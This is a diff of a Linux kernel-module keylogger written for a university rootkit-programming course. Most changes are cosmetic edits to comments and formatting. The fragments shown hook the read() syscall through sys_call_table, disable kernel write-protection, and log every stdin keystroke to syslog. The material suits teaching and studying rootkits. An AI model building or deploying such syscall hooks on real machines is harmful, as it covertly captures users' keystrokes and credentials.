@@ -1,6 +1,6 @@
 /*
  * Assignment 02 for the course Rootkit Programming at TUM in WS2014/15.
- * Implemented by Guru Chandrasekhara and Martin Herrmann
+ * Implemented by Guru Chandrasekhara and Martin Herrmann.
  */
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -17,8 +17,6 @@ asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t coun
  * Our manipulated read syscall. It will print every keystroke to the syslog
  * and call the original read afterwards.
  */
-
-
 asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count)
 {
 	long ret;
@@ -26,8 +24,10 @@ asmlinkage long manipulated_read(unsigned int fd, char __user *buf, size_t count
 	
 	//read from stdin and print it using printk
 	if(count == 1  && fd==0)
-		printk(KERN_INFO "0x%02x",buf[0]);
-	
+	{
+		printk(KERN_INFO "0x%02x \n",buf[0]);
+	}
+
 	return ret;
 }
 
@@ -61,7 +61,7 @@ static void enable_page_protection(void)
 
 /*
  * Function called when loading the kernel module.
- * Prints a welcome-message and calls the print_nr_procs() function.
+ * Prints a welcome-message and replaces the read() syscall.
  */
 int init_module(void)
 {
@@ -88,16 +88,18 @@ int init_module(void)
 
 /*
  * Function called when unloading the kernel module.
- * Prints a goodbye-message.
+ * Prints a goodbye-message and restores the original read() syscall.
  */
 void cleanup_module(void)
 {
 	printk(KERN_INFO "Unloading keylogger... bye!\n");
-	
+
+	/* disable the write-protection */	
 	disable_page_protection();
 
 	/* Return the system call back to original */
 	sys_call_table[__NR_read] = (unsigned long *)original_read;
 
+	/* reenable the write-protection */
 	enable_page_protection();	
 }
